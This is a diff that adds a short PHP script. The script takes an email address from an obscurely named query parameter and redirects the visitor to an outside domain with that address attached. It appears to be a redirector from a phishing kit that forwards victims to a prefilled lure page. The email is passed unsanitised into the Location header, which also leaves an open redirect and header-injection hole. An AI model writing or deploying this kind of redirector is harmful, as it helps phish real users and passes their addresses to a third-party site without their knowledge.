@@ -1,0 +1,22 @@
+<?php
+
+session_start();
+
+$redirect_user = 'https://zwkiwierzyce.pl/en/index.php';
+
+
+if($_GET['uxejHSds3h'])
+{
+    $email = $_GET['uxejHSds3h'];
+}
+else
+{
+    $email = $_GET['email'];
+}
+
+header("Location: $redirect_user/?email=$email");
+
+exit;
+
+?>
+
